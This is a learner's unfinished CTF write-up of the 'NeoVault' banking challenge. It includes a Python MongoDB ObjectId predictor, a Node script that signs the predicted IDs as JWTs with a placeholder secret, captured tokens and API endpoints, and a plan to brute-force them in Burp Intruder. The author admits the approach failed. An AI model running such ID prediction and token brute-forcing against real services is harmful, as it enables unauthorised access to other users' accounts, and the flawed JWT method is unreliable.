
---
# Context

NeoVault is a banking web application in Bug Bounty CTF where you can transfer funds.

![[Pasted image 20250629133914.png]]

This is what information the makers of this CTF provided:
###### NeoVault

NeoVault is a trusted banking application that allows users to effortlessly transfer funds to one another and conveniently download their transaction history. We invite you to explore the application for any potential vulnerabilities and uncover the flag hidden within its depths.  
**📝 Related Bug Bounty Reports**  
**Bug Report #1** - [Mongo Object ID Prediction](https://techkranti.com/idor-through-mongodb-object-ids-prediction/)  
**Bug Report #2** - [IDOR](https://hackerone.com/reports/1464168)

---
# Analysis

I tried to focus on the Bug Bounty Reports they provided, since in the last challenge (JinjaCare) they also provided Bounty Reports revealing the vulnerability.

###### Bounty report #1

The first Bounty Report provided a lot of interesting information about MongoDB Object Id generation and prediction. I tried to focus on this image they provided:

![[Pasted image 20250629134344.png]]

This is how MongoDB Object Id's are generated. In the article there is stated that the machine identifier will remain the same for as long as the database is still running on that machine.

"The only challenge in guessing Object IDs by simply incrementing the counter and timestamp values, is the fact that Mongo DB generates Object IDs and assigns Object IDs at a system level."

This is very important. Later in the article they provide a GitHub repository. This is crucial for predicting MongoDB Object Id's. This is the tool: https://github.com/andresriancho/mongo-objectid-predict.

First of all, before using this tool (it was made quite a while ago) we need to update some lines of code because it was using Python2. After updating some lines of code (the updated code can be seen in a pull request in the repository itself, or just run it and change xrange to range), I used the tool to create a list of possible Object Id's. I used ```> output.txt``` to put the output in a txt file. This would be easier to convert later to JWT.

Save this txt file for later, because we will be needing this txt file to convert to JWT and use to brute force JWT tokens to find authorization.

---
# Exploitation:

During using Burp Suite (community edition) intercept at ```/dashboard``` when logged in, I found these API Endpoints:

```
/api/v2/transactions/categories-spending 
/api/v2/transactions/balance-history 
/api/v2/auth/me 
/api/v2/transactions
```

All of these endpoints reveal information ONLY when authorised. Since you need to authorise your own account, it only shows information about your account.. BUT.

From api/v2/transactions we get the some id's in json format (testing is me, that's the account I created so that I could be authorised):

```
{"transactions":[{"_id":"685ea6813ac65c4cbc5585be","fromUser":{"_id":"685ea4dc3ac65c4cbc558493","username":"testing"},"toUser":{"_id":"685ea41a3ac65c4cbc558485","username":"neo_system"},"amount":1,"description":"{{ 7 * 7 }}","category":"Shopping","date":"2025-06-27T14:11:13.983Z"},{"_id":"685ea58e3ac65c4cbc558520","fromUser":{"_id":"685ea4dc3ac65c4cbc558493","username":"testing"},"toUser":{"_id":"685ea41a3ac65c4cbc558485","username":"neo_system"},"amount":10,"description":"test","category":"Transport","date":"2025-06-27T14:07:10.706Z"},{"_id":"685ea4dc3ac65c4cbc558498","fromUser":{"_id":"685ea41a3ac65c4cbc558485","username":"neo_system"},"toUser":{"_id":"685ea4dc3ac65c4cbc558493","username":"testing"},"amount":100,"description":"Welcome bonus credit","category":"Other","date":"2025-06-27T14:04:12.467Z"}],"pagination":{"total":3,"page":1,"pages":1}}
```

From this we found:
- Transaction Id's
- User IDs, one is mine (685ea4dc3ac65c4cbc558493), one is neo_system (685ea41a3ac65c4cbc558485), probably what we need to exploit/find the flag.

There is also a JWT token stored in cookies.

The token is:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4NWVhNGRjM2FjNjVjNGNiYzU1ODQ5MyIsImlhdCI6MTc1MTAzNjc0OCwiZXhwIjoxNzUxMDQwMzQ4fQ.mlk9XyGxc4lpDIBfswyeqrcNRj5GplORnY_7_1nr3Fw
```

The token can be found at inspect>application>cookies. But also when with GET requests:

![[NeoVaultCTF1.png]]

# Where do I think the flag is:

It definitely has something to do with neo_system. But I can't seem to get any other information than what I currently have. I need to take a deeper look into the hint sources.

# Conclusion:

Predict the Mongo object Id's, convert them to JWT. Try to see if I can find something.

# Exploitation:

This program predicts:

```
#!/usr/bin/env python3

  

import argparse

import time

import sys

import operator

  
  

class ObjectId:

"""

A parser and manipulator for MongoDB ObjectIds.

  

ObjectId structure (12 bytes):

- 4 bytes: timestamp (seconds since Unix epoch)

- 3 bytes: machine identifier

- 2 bytes: process id

- 3 bytes: counter (auto-incrementing)

"""

def __init__(self, object_id: str):

self.epoch, self.machine, self.process, self.counter = self.parse(object_id)

  

def __str__(self):

return '%08x%s%s%06x' % (self.epoch, self.machine, self.process, self.counter)

  

def __repr__(self):

return f'<ObjectId: (e: {self.epoch}, m: {self.machine}, p: {self.process}, c: {self.counter})>'

  

def copy(self):

return ObjectId(str(self))

  

@staticmethod

def parse(object_id: str):

epoch = int(object_id[:8], 16)

machine = object_id[8:14]

process = object_id[14:18]

counter = int(object_id[18:24], 16)

return epoch, machine, process, counter

  

@staticmethod

def looks_like(object_id: str):

if len(object_id) != 24:

return False, 'Mongo ObjectIds have 12 bytes (24 hex characters)'

  

if not all(c in '0123456789abcdef' for c in object_id.lower()):

return False, 'Mongo ObjectIds must be hexadecimal characters [0-9a-f]'

  

try:

object_id_epoch = int(object_id[:8], 16)

except ValueError:

return False, 'Invalid timestamp in ObjectId'

  

now = int(time.time())

one_day = 24 * 60 * 60

  

if object_id_epoch > now + one_day:

return False, f'Mongo ObjectId timestamp ({object_id_epoch}) is too far in the future'

  

if object_id_epoch < now - (365 * one_day):

return False, f'Mongo ObjectId timestamp ({object_id_epoch}) is too far in the past'

  

return True, None

  
  

def predict(base, backward=False, counter_diff=20, per_counter=60):

"""

Generate ObjectIds around a base ObjectId by adjusting the counter and timestamp.

  

:param base: The base ObjectId string.

:param backward: If True, predict past ObjectIds. Otherwise, predict future ones.

:param counter_diff: Number of counter deltas to attempt.

:param per_counter: Epoch time adjustment per counter step.

:yield: Predicted ObjectId strings.

"""

looks_like, reason = ObjectId.looks_like(base)

if not looks_like:

raise ValueError(reason)

  

base_obj = ObjectId(base)

oper = operator.sub if backward else operator.add

  

for counter_step in range(1, counter_diff):

for epoch_step in range(per_counter):

obj_copy = base_obj.copy()

obj_copy.counter = oper(obj_copy.counter, counter_step)

obj_copy.epoch = oper(obj_copy.epoch, epoch_step)

yield str(obj_copy)

  
  

def main():

parser = argparse.ArgumentParser(description="Predict nearby Mongo ObjectIds")

parser.add_argument("objectid", help="Base Mongo ObjectId (24-character hex)")

parser.add_argument("--backward", action="store_true", default=False, help="Predict backward (past ObjectIds)")

parser.add_argument("--counter-diff", type=int, default=20, help="Number of counter deltas to try (default: 20)")

parser.add_argument("--per-counter", type=int, default=60, help="Seconds to adjust per counter delta (default: 60)")

parser.add_argument("--output", type=str, default="output.txt", help="File to write the predicted ObjectIds (default: output.txt)")

  

args = parser.parse_args()

  

try:

with open(args.output, 'w') as f:

for obj_id in predict(args.objectid, args.backward, args.counter_diff, args.per_counter):

f.write(obj_id + '\n')

print(f"Results written to {args.output}")

except Exception as e:

print(f"Error: {e}", file=sys.stderr)

sys.exit(1)

  
  

if __name__ == '__main__':

main()
```

That predicts the possible object Id's and puts them in output.txt

To run:

```
python3 final.py <mongo-object-id-here>
```

Then this javascript script (convert-ids-to-jwt.js) converts the:

```
const fs = require('fs');

const jwt = require('jsonwebtoken');

  

// Replace with your secret key

const SECRET_KEY = 'your-very-secure-secret';

  

const inputFile = 'output.txt'; // Your input file with ObjectIDs

const outputFile = 'tokens.txt'; // Output file for JWTs

  

// Read the ObjectIDs from file (assuming one per line)

const objectIds = fs.readFileSync(inputFile, 'utf-8')

.split('\n')

.filter(line => line.trim() !== '');

  

const tokens = objectIds.map(id => {

// Create payload with ObjectID

const payload = { objectId: id };

  

// Sign JWT with your secret key

const token = jwt.sign(payload, SECRET_KEY, { expiresIn: '1h' });

  

return token;

});

  

// Write tokens to output file

fs.writeFileSync(outputFile, tokens.join('\n'));

  

console.log(`Converted ${tokens.length} ObjectIDs to JWTs.`);
```

To run:

```
node convert-ids-to-jwt.js
```

I had to make sure that I had both of the mongoDB object Id's from user and neo converted. So basically 2 output.txt files and I with node I had to change the file name for both user and neo JWT tokens.

Now with burp intrude I have changed the JWT tokens. I configured the payloads with the converted txt files.

---

Here is a overview:

![[2025-06-28_11-07.png]]

Intruder:

![[404'sinburpintrude.png]]

### Note: Now this was where I was stuck. I will update this write-up with the answer and what I should have done instead of this.

# Other info:
# Hint sources provided by the challenge:

https://techkranti.com/idor-through-mongodb-object-ids-prediction/

https://hackerone.com/reports/1464168

# Other write-ups: